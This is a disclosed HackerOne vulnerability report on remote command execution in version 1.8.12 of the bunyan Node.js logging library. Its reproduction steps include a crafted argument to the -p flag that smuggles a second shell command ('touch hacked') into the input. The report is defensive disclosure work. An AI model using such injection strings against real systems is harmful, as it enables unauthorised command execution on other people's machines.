# [H] bunyan - RCE via insecure command formatting

## Summary
Severity: High
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: ahihi
State: resolved
Disclosed: 2020-06-27T01:53:03.703Z
Source: https://hackerone.com/reports/902739

## Details
I would like to report RCE in bunyan
It allows arbitrary commands remotely inside the victim's PC

# Module

**module name:** bunyan
**version:** 1.8.12
**npm page:** `https://www.npmjs.com/package/bunyan`

## Module Description

> Bunyan is a simple and fast JSON logging library for node.js services:

## Module Stats

[920,196] weekly downloads

# Vulnerability

## Vulnerability Description

> The issue occurs because a user input is formatted inside a command that will be executed without any check. https://github.com/trentm/node-bunyan/blob/master/bin/bunyan#L1224

## Steps To Reproduce:

> Run the following command
npm install bunyan
./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
> Recheck the files: now hacked has been created
## Patch

> Check input before command

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION]: Ubuntu 18.04

_Trimmed to 38 lines — full report: https://hackerone.com/reports/902739_
